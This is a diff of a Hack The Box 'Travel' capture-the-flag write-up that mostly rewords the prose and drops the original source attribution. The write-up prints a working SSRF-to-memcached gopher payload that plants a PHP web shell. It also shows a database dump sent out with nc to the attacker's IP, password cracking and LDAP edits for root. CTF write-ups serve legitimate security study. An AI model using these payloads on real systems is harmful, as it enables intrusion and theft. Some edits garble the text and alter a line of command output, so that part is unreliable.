@@ -6,9 +6,9 @@ points: 40
 rating: 4.9
 date: 2020-05-16
 avatar: assets/htb/travel.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Travel
 ---
+
 ## HTB - Travel
 
 ### Overview
@@ -27,7 +27,7 @@ htb_url: https://app.hackthebox.com/machines/Travel
 
 #### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oG <name>` saves the output with a filename of `<name>`, `-n` stops DNS resolution of hosts, and `-v` allows me to see progress as it discovers things rather than waiting for the full report when it finishes.
+I kicked off enumeration with an nmap scan against `<YOUR_IP>`. My go-to flags are: `-p-`, a shorthand that tells nmap to cover every port, `-sC` which is the same as `--script=default` and fires a set of nmap enumeration scripts at the host, `-sV` for service detection, `-oG <name>` to write the output to a file called `<name>`, `-n` to skip DNS resolution, and `-v` so I can watch results come in live instead of waiting for the final report.
 
 ```text
 ┌──(kac0㉿kali)-[~]
@@ -64,24 +64,24 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Nmap done: 1 IP address (1 host up) scanned in 15.35 seconds
 ```
 
-The only ports that nmap showed as open on this machine were 22 \(SSH\), 80 \(HTTP\), and 443 \(HTTPS\). From the nmap DNS NSE script scan I saw three virtual hosts for this IP:
+nmap reported just three open ports on the box: 22 \(SSH\), 80 \(HTTP\), and 443 \(HTTPS\). The DNS NSE script output also revealed three virtual hosts tied to the IP:
 
 ```text
 Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb
 ```
 
-I added all three to my `/etc/hosts` file so I could connect.
+I added all three to `/etc/hosts` so I could reach them.
 
-Connecting to `www.travel.htb` I found a "coming soon" type site with a countdown. On this site I found a contact information section with a potential a user email format.
+Browsing to `www.travel.htb` gave me a "coming soon" landing page with a countdown. The page had a contact section that hinted at the likely user email format.
 
 ```text
 CONTACT INFORMATION
 hello@travel.htb Park Ave, 987, London, United Kingdom.
 ```
 
-Checking port 443 only led to an under construction site with no useful information.
+Port 443 just showed an under-construction page with nothing useful on it.
 
-The Firefox plugin `wappalyzer` told me the site was using WordPress version 5.4. I fired up `wpscan` to check the site for vulnerabilities using the syntax`wpscan --url http://blog.travel.htb/ --enumerate`.
+The Firefox extension `wappalyzer` reported the site was running WordPress 5.4. I launched `wpscan` to look for weaknesses with the command `wpscan --url http://blog.travel.htb/ --enumerate`.
 
 ```text
 robots.txt found: http://blog.travel.htb/robots.txt
@@ -108,25 +108,25 @@ robots.txt found: http://blog.travel.htb/robots.txt
  | Found By: Author Posts
 ```
 
-I discovered a WordPress login page at `http://blog.travel.htb/wp-login.php` but there was nothing else useful from the scan.
+The scan turned up a WordPress login form at `http://blog.travel.htb/wp-login.php`, but nothing else of value.
 
-I tried resetting my password since this version of WordPress was reportedly vulnerable to information leakage through this, but it did not lead to anything useful.
+I attempted a password reset since this WordPress version was said to leak information through that feature, but it went nowhere.
 
-The page at `xmlrpc.php` likewise did not seem to be useful at this time.
+The `xmlrpc.php` endpoint also seemed to offer nothing at this point.
 
-Navigating to the virtual host `blog-dev` also seemed to be a dead-end, so I started another Dirbuster scan to see if anything useful that I could access could be found.
+The `blog-dev` virtual host looked like a dead end too, so I started another Dirbuster scan hoping to find something reachable.
 
-There was an RSS feed using the Awesome RSS WordPress plugin on the `blog` site.
+The `blog` site hosted an RSS feed built on the Awesome RSS WordPress plugin.
 
-In the source code of the page I noticed a section that said `DEBUG` that caught my eye. I didn't know what to do with it, but it seemed interesting.
+While reading the page source I spotted a `DEBUG` section that grabbed my attention. I wasn't sure what to do with it yet, but it looked promising.
 
-There was also a section that talked about using "Additional CSS" and importing it from the `dev` site. This seemed like a potential way to get code to cross domains.
+There was also a mention of using "Additional CSS" pulled in from the `dev` site, which struck me as a possible way to move code between domains.
 
-Another interesting find was the raw XML output that feeds the RSS page. Perhaps there was an XML deserialization vulnerability in the site.
+The raw XML powering the RSS page was another notable find. It hinted at a possible XML deserialization flaw in the site.
 
-Since the `wpscan` results didn't seem to yield any useful information I checked out my Dirbuster scan of the `dev-blog` site and looked for interesting directories.
+With nothing useful coming out of `wpscan`, I turned to my Dirbuster scan of the `dev-blog` site and combed through the interesting directories.
 
-I found a potentially accessible git repo while scanning `blog-dev` with dirbuster.
+The Dirbuster run against `blog-dev` revealed what looked like an exposed git repo.
 
 _The dirbuster scan also shows that some security has been put in place against automated scanners. I could see the repeated chain of /./ dirs that told me the scanner was stuck. After telling it to ignore those directories it found the `git` directory._
 
@@ -135,7 +135,7 @@ _The dirbuster scan also shows that some security has been put in place against 
 └─$ python3 ~/.local/bin/git-dumper/git-dumper.py http://blog-dev.travel.htb/ gitdump
 ```
 
-I made a folder named `gitdump` to dump the contents of the git repo into and ran `git-dumper` \(from [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)\) to clone the repository.
+I created a directory called `gitdump` to hold the repo contents and ran `git-dumper` \(from [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)\) to pull down the repository.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/travel/gitdump]
@@ -165,7 +165,7 @@ drwxr-xr-x 7 kac0 kac0 4096 Sep 18 20:21 objects
 drwxr-xr-x 3 kac0 kac0 4096 Sep 18 20:21 ref
 ```
 
-The repository appeared to be the source code for the Awesome RSS application I saw earlier. The `README.md` file described the current status of the project.
+The repo turned out to hold the source for the Awesome RSS app I'd come across earlier. The `README.md` laid out where the project currently stood.
 
 ```text
 # Rss Template Extension
@@ -191,29 +191,29 @@ Allows rss-feeds to be shown on a custom wordpress page.
 - finish logging implementation
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-memcache.png)
+![](assets/wu/travel/img-1.png)
 
-The PHP file `rss_template.php` parses URLs and then creates SimplePie objects from them and sets that object's cache location to a local memcache. SimplePie is a WordPress plugin that allows for RSS feeds in php-based sites. . Feeds are requested from the `custom_feed_url` parameter if it exists, otherwise it defaults to `http://www.travel.htb/newsfeed/customfeed.xml` which I found earlier through dirbuster.
+The PHP file `rss_template.php` parses URLs, builds SimplePie objects from them, and points each object's cache at a local memcache. SimplePie is a WordPress plugin that enables RSS feeds on PHP-based sites. . Feeds are fetched from the `custom_feed_url` parameter when present; otherwise it falls back to `http://www.travel.htb/newsfeed/customfeed.xml`, which I'd already located via dirbuster.
 
-[Memcached](https://memcached.org/) is used to cache requests in memory in the form of key-value pairs so that they can be retrieved quickly without making multiple requests. In this instance the memcache keys are prefixed with `xct_` when they are stored.
+[Memcached](https://memcached.org/) caches requests in memory as key-value pairs so they can be served quickly without repeated requests. Here the memcache keys get a `xct_` prefix when stored.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/13-ips.png)
+![](assets/wu/travel/img-2.png)
 
-There was further evidence of website security in the file `template.php`. It looked like they were trying to implement a rudimentary web application firewall by filtering out any requests that contained `file://`, `@`, `-o`, `-F`, or attempts to access the localhost. Even though some URL filtering is used, there are still many ways to bypass this. For example, `ftp://` or even `gopher://` could be used instead of `file://`, and if the localhost needs to be directly referenced different encoding schemes could be used. For example, 127.0.0.1 in hex is `0x7F000001`, and in decimal `2130706433`. Most URL parsers can automatically translate addresses no matter which numbering scheme is used.
+The file `template.php` showed more signs of site hardening. They appeared to be building a crude web application firewall that strips out any request containing `file://`, `@`, `-o`, `-F`, or attempts to reach localhost. Even with that URL filtering, plenty of bypasses remain. For instance, `ftp://` or `gopher://` work instead of `file://`, and localhost can be referenced using alternate encodings. As an example, 127.0.0.1 is `0x7F000001` in hex and `2130706433` in decimal. Most URL parsers will translate addresses automatically regardless of the numeric base used.
 
-The TemplateHelper class uses the `file_put_contents()` function to write data to a file in the `/logs/` directory. This method is called from the `__construct()` and `__wakeup()` functions through the `init()` function. These two functions are known as "[magic methods](https://www.php.net/manual/en/language.oop5.magic.php)" in PHP and are triggered when certain actions happen. For example, the `__wakeup()` method is called when an object is deserialized. Since these are public functions, they can be called from other PHP files that reference this document, such as seen in `rss_template.php`.
+The TemplateHelper class relies on `file_put_contents()` to write data to a file under `/logs/`. That gets called from `__construct()` and `__wakeup()` by way of `init()`. The latter two are PHP "agic methods](https://www.php.net/manual/en/language.oop5.magic.php)" that fire automatically on certain events. For example, `__wakeup()` runs when an object is deserialized. Because these are public functions, other PHP files that include this one can call them, as `rss_template.php` does.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12.5-debug.png)
+![](assets/wu/travel/img-3.png)
 
-The `rss_template.php` also has code that includes a `debug.php` if the parameter `debug` is set. This is what I had seen in the source code of the `/awesome-rss` site. After noticing this in the PHP code I went back to the same page to see if I could trigger this to do something. I set the debug flag by typing `http://blog.travel.htb/awesome-rss?debug` in the URL bar and got back something different in the page's source code than before.
+`rss_template.php` also pulls in a `debug.php` whenever the `debug` parameter is set. This matched what I'd seen in the source of the `/awesome-rss` site. After catching this in the code, I returned to that page to see whether I could trigger it. Setting the debug flag by visiting `http://blog.travel.htb/awesome-rss?debug` produced different page source than before.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/14.5-debug.png)
+![](assets/wu/travel/img-4.png)
 
-Using the `debug` parameter added a bit of deserialized PHP code to the middle of the page, but there was nothing that seemed immediately useful. I did notice that the key portion of the output was prefixed with `_xct` like described in the PHP code.
+The `debug` parameter dropped some deserialized PHP into the middle of the page, but nothing jumped out as immediately exploitable. I did notice the key part of the output carried the `_xct` prefix mentioned in the PHP code.
 
-The `url_get_contents()` function in `rss_template.php` allows for the import of a custom URL through the `custom_feed_url` attribute, so I hosted a web server using python SimpleHTTPServer and accessed my test page by loaded my custom URL using this link: [http://blog.travel.htb/awesome-rss/?custom\_feed\_url=http://10.10.15.53:8090/test.html](http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.15.53:8090/test.html)
+The `url_get_contents()` function in `rss_template.php` lets you supply an arbitrary URL through the `custom_feed_url` attribute, so I stood up a python SimpleHTTPServer and loaded my test page through this link: [http://blog.travel.htb/awesome-rss/?custom\_feed\_url=http://10.10.15.53:8090/test.html](http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.15.53:8090/test.html)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/15-blank-test.png)
+![](assets/wu/travel/img-5.png)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/travel]
@@ -228,25 +228,25 @@ Serving HTTP on 0.0.0.0 port 8090 ...
 <YOUR_IP> - - [18/Sep/2020 21:04:23] "GET /test.html HTTP/1.1" 200 -
 ```
 
-Unfortunately the test did not actually load anything on the page, though I noticed that it did reach back to my server and pull the contents of the directory, including pulling some .png files automatically \(and interestingly also including a .netxml file I had in the directory from playing around with airodump-ng earlier that day.\)
+The test didn't render anything on the page, but I saw the server reach back to me and grab the directory contents, automatically pulling several .png files \(and oddly even a .netxml file I'd left there from messing with airodump-ng earlier that day.\)
 
-This confirmed the SSRF vulnerability that the rudimentary PHP WAF was trying to protect against, though I still needed to figure out how to make it run code. Storing it in the memcached key that I saw being loaded through `debug.php` seemed like a likely route. Since directly referencing file includes in a URL using the most common methods were blocked, I needed to to use a less common method. Searching for SSRF file inclusion bypass led me to [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).
+That confirmed the SSRF flaw the rudimentary PHP WAF was meant to stop, though I still had to work out how to get code execution. Planting it in the memcached key being loaded by `debug.php` looked like the most likely path. Since the usual ways of referencing file includes in a URL were blocked, I needed a less common technique. Searching for SSRF file inclusion bypasses led me to [https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf).
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16.5-memcached-vuln.png)
+![](assets/wu/travel/img-6.png)
 
-This presentation from Black Hat included one case study where the researcher found a vulnerability where they were able to use SSRF to exploit Memcached. This example looked like exactly what I needed.
+This Black Hat talk included a case study where the researcher leveraged SSRF to attack Memcached. It looked like precisely what I needed.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-internal-memcached-short.png)
+![](assets/wu/travel/img-7.png)
 
-From `rss_template.php` I found the syntax to connect including the address `127.0.0.1:11211`. Since the data to be included has to come from the local machine, I needed a way to embed it without pulling files from my machine. After doing some research, I decided to try doing this using the [gopher protocol](https://en.wikipedia.org/wiki/Gopher_%28protocol%29). Gopher is an older protocol that is used to access resources over a network but is still supported by most browsers as well as tools such as cURL.  The Gopher protocol was first described in [RFC 1436](https://tools.ietf.org/html/rfc1436). IANA assigned it TCP port 70, though this is rarely ever used.
+From `rss_template.php` I picked up the connection syntax, including the address `127.0.0.1:11211`. Since the included data has to originate on the local box, I needed a way to embed it without fetching files from my own machine. After a bit of research I opted to try the [gopher protocol](https://en.wikipedia.org/wiki/Gopher_%28protocol%29). Gopher is an older protocol for accessing networked resources that most browsers and tools like cURL still support. It was originally defined in [RFC 1436](https://tools.ietf.org/html/rfc1436). IANA gave it TCP port 70, though that's hardly ever used.
 
- I sent a request in the browser to test this out using my customized URL, using the hex-encoded IP `0x7F000001` in place of `127.0.0.1`.
+ I fired a request from the browser to test this with my crafted URL, substituting the hex-encoded IP `0x7F000001` for `127.0.0.1`.
 
 ```text
 http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7F000001:11211/_%0d%0aset%20TEST%204%200%204%0d%0atest%0d%0a
 ```
 
-This created a key named `TEST` in memcached with the value `test`. Using the `?debug` flag again after requesting the above URL returns the following:
+That set a key called `TEST` in memcached holding the value `test`. Hitting the URL above and then re-requesting with `?debug` returns:
 
 ```markup
 <!--
@@ -258,45 +258,41 @@ DEBUG
 -->
 ```
 
-My test key was successfully cached! Now I had to see if I could use this to exploit the site. Since memcached stores PHP objects in a serialized format it can be exploited by injecting a malicious object and triggering it through deserialization using the `__wakeup()` method I saw earlier. The code from the git dump didn't seem to have any methods for direct deserialization, so I looked at the RSS feed SimplePie plugin source code on GitHub to see if it held any clues.
+My test key was cached as expected. The next step was to see whether I could weaponize this against the site. Because memcached keeps PHP objects in serialized form, it can be abused by injecting a malicious object and triggering it on deserialization through the `__wakeup()` method I'd seen. The git-dumped code had no obvious direct deserialization routines, so I reviewed the SimplePie plugin source on GitHub for hints.
 
 ### SimplePie code review
 
-{% hint style="danger" %}
 Beware, the following section is a labyrinthine mess of tracing function calls across multiple libraries and classes.  I'll try to explain as best I can, but if you would rather skip this section click [here](travel-write-up.md#crafting-the-payload).
-{% endhint %}
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16-memcached-short.png)
+![](assets/wu/travel/img-8.png)
 
 [https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcached.php](https://github.com/WordPress/WordPress/blob/master/wp-includes/SimplePie/Cache/Memcached.php)
 
-I didn't have to look through the code long to find the relevant code.  The `__construct` function from the `SimplePie_Cache_Memcached` class is what is called by the `get_feed()` function in the website's code.  It looked like they had left the default host and port values, but had customized the `timeout` and `prefix` values.  This code further explained what was actually stored in the memcached key. 
+It didn't take much digging to land on the relevant code.  The `__construct` function of the `SimplePie_Cache_Memcached` class is the one called by the site's `get_feed()` function.  They'd kept the default host and port but changed the `timeout` and `prefix` values.  This clarified what actually lands in the memcached key. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/16.75-memcached-cache.png)
+![](assets/wu/travel/img-9.png)
 
-I also decided to check in `Misc.php` and `Cache.php` since they were referenced in the `Memcache.php` code. `Cache.php` has a `get_handler` function which returns an object based on the type of handler requested. One of the handlers is `SimplePie_Cache_Memcached`. In this the `$name` variable is set to `$filename` and the `$type` variable is set to `$extension`.
+I also looked into `Misc.php` and `Cache.php` since `Memcache.php` references them. `Cache.php` defines a `get_handler` function that returns an object depending on the requested handler type. `SimplePie_Cache_Memcached` is one of those handlers. In it `$name` is set to `$filename` and `$type` to `$extension`.
 
-Looking back at the source code of `Memcached.php`, I traced through what was going on. This function takes the MD5 hash of `$name` \(filename\) and `$type` \(extension\)  together. The prefix \(in this case `_xct`\) is added to the front afterwards. 
+Going back over the `Memcached.php` source, I traced the flow. The function takes the MD5 hash of `$name` \(filename\) and `$type` \(extension\) together. The prefix \(here `_xct`\) is then prepended. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-cache-handler-link.png)
+![](assets/wu/travel/img-10.png)
 
-I spent awhile looking for the proper usage of this method, but finally came across Class-SimplePie.php. 
+It took me a while to track down how this method is actually used, but I eventually found it in Class-SimplePie.php. 
 
 ```php
 $cache = $this->registry->call('Cache', 'get_handler', array($this- cache_location, call_user_func($this->cache_name_function, $url), 'spc')); 
 ```
 
-This code calls the `get_handler()` function from `Cache.php` with the parameters `cache_location` ,`cache_name_function($url)`, and a filetype of `spc`. 
+This calls `get_handler()` from `Cache.php` with `cache_location`, `cache_name_function($url)`, and a filetype of `spc`. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/17-cache-name.png)
+![](assets/wu/travel/img-11.png)
 
-After searching inside the SimplePie class for `$cache_name_function` I found a small function that set it  to `md5`.  
+Searching the SimplePie class for `$cache_name_function`, I found a short function that sets it to `md5`.  
 
-_**The end result of all of this:**_ It means that `$filename` \(later `$name`\) is set to the MD5 sum of the URL `md5($url)` , while `$extension` \(later `$type`\) is set to `spc` . This result is then all concatenated and the MD5 sum is taken and appended with `_xct`. This gives me the information I need to create the memcached key to store my malicious payload in.  the `__construct` method above gives the template. Some pseudo-code for this result is `key_name = _xct + md5sum( md5sum(url) + ':spc' )` I verified this by using the original URL of the page I ran debug on.
+_**The end result of all of this:**_ It means `$filename` \(later `$name`\) is the MD5 of the URL `md5($url)`, while `$extension` \(later `$type`\) is `spc`. Those are concatenated, the MD5 is taken, and `_xct` is prepended. That's everything I need to build the memcached key that holds my malicious payload.  the `__construct` method above provides the template. As pseudo-code: `key_name = _xct + md5sum( md5sum(url) + ':spc' )`. I confirmed it using the original URL of the page I'd run debug against.
 
-{% hint style="info" %}
 _It took me a few tries to get the right URL.  First I tried just the part after **`/newsfeed/`**, then I forgot to add the **`http://`**.  The final working URL that matched the result I was looking for was **`http://www.travel.htb/newsfeed/customfeed.xml`**._
-{% endhint %}
 
 ### Crafting the payload
 
@@ -310,7 +306,7 @@ _It took me a few tries to get the right URL.  First I tried just the part after
 4e5612ba079c530a6b1f148c0b352241  -
 ```
 
-The beginning of this resultant hash matches the output I saw in the debug code given by the `customfeed.xml` site earlier! 
+The start of this resulting hash lines up with the debug output the `customfeed.xml` page gave me earlier! 
 
 > In the Memcached.php class, I  also see a load\(\) method that calls unserialize\(\).
 >
@@ -343,7 +339,7 @@ echo serialize($back_door);
 ?>
 ```
 
-This PHP script [serializes](https://www.w3schools.com/PHP/func_var_serialize.asp) an instance of the class `TemplateHelper`, which will write a my backdoor to a file called `back_door.php` in the `/jobs/` folder after deserialization.
+This PHP script [serializes](https://www.w3schools.com/PHP/func_var_serialize.asp) a `TemplateHelper` instance that, once deserialized, drops my backdoor into a file named `back_door.php` inside the `/jobs/` folder.
 
 > Next, we need to set this payload as a value for the key `xct_4e5612ba079c530a6b1f148c0b352241` so that it is deserialized when the debug method is called.
 
@@ -391,11 +387,9 @@ HAVE TO decimal/hex encode 127.0.0.1~~~!!! 2130706433 or 0x7f000001 and add xct\
 http://blog.travel.htb/awesome-rss/?custom_feed_url=gopher://0x7f000001:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20111%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:13:%22back_door.php%22%3Bs:4:%22data%22%3Bs:34:%22%3C%3Fphp%20system%28%24_REQUEST%5B%27test%27%5D%29%3B%3F%3E%22%3B%7D%0d%0a
 ```
 
-After that it took awhile to figure out where my `back_door.php` was located. I found a hint in the README.md file I had found in the git repository earlier: `* create logs directory in wp-content/themes/twentytwenty` after that the TemplateHelper class told me it was stored in the `/logs/` folder. 
+After that I had to work out where my `back_door.php` had landed. A clue came from the README.md I'd pulled from the git repo earlier: `* create logs directory in wp-content/themes/twentytwenty`, and the TemplateHelper class confirmed it goes in the `/logs/` folder. 
 
-{% hint style="info" %}
- If you look closely at the output when I ran my PHP code above, it tried to put the resultant file in the **`/home/kac0/htb/travel/logs/`** which did not exist, so it gave an error.
-{% endhint %}
+ If you look closely at the output from when I ran my PHP code above, it tried to drop the file in **`/home/kac0/htb/travel/logs/`**, which didn't exist, hence the error.
 
 a shell can be obtained by using parameter on the backdoor:
 
@@ -450,13 +444,13 @@ www-data@blog:/opt/wordpress$ nc 10.10.15.53 9099 < backup-13-04-2020.sql
 nc 10.10.15.53 9099 < backup-13-04-2020.sql
 ```
 
-In the `/opt/wordpress` directory found and extracted a .sql file to my home machine; tried to open with `sqlitebrowser` but it told me it wasnt a valid database. I used the file command on it and it said it was a stnadard ASCII file so I opened it with `vim` and started browsing
+Inside `/opt/wordpress` I found a .sql file, which I exfiltrated to my own box; I tried opening it in `sqlitebrowser` but was told it wasn't a valid database. Running the file command on it reported a standard ASCII file, so I opened it in `vim` and started reading through it
 
 picture
 
 ### Finding user credentials
 
-It was a sqldump output file rather than an actual database, but contained all of the recent queries to the database. I found password hashes for an `admin` user and `lynik-admin` , loading in hash-identifier to check what type of hash then loaded to crack with hashcat
+It was a sqldump output rather than a real database, holding all the recent queries against the DB. I located password hashes for an `admin` user and `lynik-admin`, ran hash-identifier to determine the hash type, then loaded them into hashcat for cracking
 
 ```text
 INSERT INTO `wp_users` VALUES
@@ -525,7 +519,7 @@ Started: Sat Sep 19 14:31:07 2020
 Stopped: Sat Sep 19 14:37:41 2020
 ```
 
-Unfortunately I was only able to crack one of the hashes. The password for `lynik-admin` was `1stepcloser` , which I then used to SSH into the machine.
+I only managed to crack one of the two hashes. The `lynik-admin` password came back as `1stepcloser`, which I then used to SSH into the box.
 
 ### Road to User
 
@@ -562,7 +556,7 @@ lynik-admin@travel:~$ sudo -l
 Sorry, user lynik-admin may not run sudo on travel.
 ```
 
-I tried to see what `lynik-admin` could do with sudo, but apparently this user was not in the sudoers file
+I checked what `lynik-admin` could do via sudo, but the user clearly wasn't listed in the sudoers file
 
 ### User.txt
 
@@ -592,7 +586,7 @@ drwx------ 2 lynik-admin lynik-admin 4096 Apr 23 19:34 .cache
 -rw------- 1 lynik-admin lynik-admin  861 Apr 23 19:35 .viminfo
 ```
 
-In `lynik-admin`'s home folder I found a `.ldaprc` file which looked interesting. According to the [manpage ](http://manpages.ubuntu.com/manpages/cosmic/man5/ldap.conf.5.html)this file is used to set configuration variables for connecting to LDAP.
+In `lynik-admin`'s home directory there was an interesting `.ldaprc` file. Per the anpage ](http://manpages.ubuntu.com/manpages/cosmic/man5/ldap.conf.5.html)this file holds the configuration variables for connecting to LDAP.
 
 ```text
 ldap.travel.htb
@@ -600,7 +594,7 @@ BASE dc=travel,dc=htb
 BINDDN cn=lynik-admin,dc=travel,dc=htb
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/22-vim-delete.png)
+![](assets/wu/travel/img-12.png)
 
 this file is used to store Vim history data. You can find recent files, deleted data, and search history here.There is a line which was deleted from the .ldaprc file. bind password = `Theroadlesstraveled` . Let's try using it to connect to LDAP.
 
@@ -610,7 +604,7 @@ To do this remotely I would use the command:
 ldapsearch -x -h 127.0.0.1 -b "DC=travel,DC=htb" -D "CN=lynik-admin,DC=travel,DC=htb" -w Theroadlesstraveled 
 ```
 
- The `-h` option specifies the host to connect to, and the `-x` option means use simple anonymous authentication. The `-b` flag is used to specify the search base, while the `-D` flag specifies the bind Domain Name, both of which can be found in the `.ldaprc` file above. `-w` is used to specify the bind password.
+ `-h` sets the host to connect to and `-x` selects simple anonymous authentication. `-b` sets the search base and `-D` gives the bind Domain Name, both of which come from the `.ldaprc` file above. `-w` supplies the bind password.
 
 But...since I am logged in why do it the hard way?
 
@@ -869,9 +863,9 @@ result: 0 Success
 # numEntries: 21
 ```
 
-I was able to successfully dump the contents of the LDAP database, and found a list of users.  
+I managed to dump the full LDAP database and got a list of users.  
 
-Since `lynik-admin` is an LDAP administrator, I now had the ability to modify user and device attributes stored in the LDAP database.  In a Windows domain, this could give me the ability to promote a user to domain admin if I wished.  In this case I will just try to use this to promote a user to root.  Modifying LDAP through standard queries is pretty tedious, so I used Apache's Directory Studio to get a nice simple GUI.  This can be downloaded for free from [https://directory.apache.org/studio/downloads.html](https://directory.apache.org/studio/downloads.html).
+Because `lynik-admin` is an LDAP administrator, I could now alter user and device attributes held in the LDAP database.  On a Windows domain this kind of access could let me bump a user up to domain admin; here I'll instead use it to elevate a user to root.  Editing LDAP via raw queries is quite tedious, so I reached for Apache's Directory Studio and its clean GUI.  It's a free download from [https://directory.apache.org/studio/downloads.html](https://directory.apache.org/studio/downloads.html).
 
 need to port forward 389 \(need sudo rights for low port\)
 
@@ -911,7 +905,7 @@ lynik-admin@travel:/var$ ip a
     link/ether da:10:aa:7a:cb:5f brd ff:ff:ff:ff:ff:ff link-netnsid 3
 15: veth5af27ca@if14: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
     link/ether 02:e7:02:1d:f1:36 brd ff:ff:ff:ff:ff:ff link-netnsid 5
-17: veth94d1920@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-8ec6dcae5ba1 state UP group default 
+17: veth94d1920@if16: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-836575a2ebbb state UP group default 
     link/ether e6:86:a7:88:79:dd brd ff:ff:ff:ff:ff:ff link-netnsid 4
 
 lynik-admin@travel:/var$ cat /etc/hosts
@@ -963,7 +957,7 @@ login as `lynik` failed with password, but it says that only an ssh key can be u
 
 > According to the sshd\_config manpage, the AuthorizedKeysCommand configuration is used to specify the program from which the SSH server retrieves user public keys from. The sss\_ssh\_authorizedkeys utility retrieves user public keys from the specified domain. According to the documentation, SSH public keys can be stored in the sshPublicKey attribute in LDAP.
 
-Next I tried adding the public key attribute to the `lynik` user. First, I had to add a new objectClass attribute then select ldapPublicKey After that I added the attribute sshPublicKey to `lynik` and clicked on `Edit as Text` in the editor and paste the public key.
+So I went on to add the public key attribute to the `lynik` user. I first had to add a new objectClass attribute and pick ldapPublicKey, then I added the sshPublicKey attribute to `lynik`, hit `Edit as Text` in the editor, and pasted in the public key.
 
 searching for ssh keys and ldap led to [https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap](https://serverfault.com/questions/653792/ssh-key-authentication-using-ldap) which shows that it is possible to add keys through ldap
 
@@ -1073,7 +1067,7 @@ docker:x:117:
 sssd:x:118:
 ```
 
-I checked sudoers file and saw that admins and members of sudo group can run all commands as root so I changed group id to 27 \(sudo\) then logout and back in
+I looked at the sudoers file and saw that admins and members of the sudo group can run every command as root, so I set the group id to 27 \(sudo\), logged out, and logged back in
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/travel]
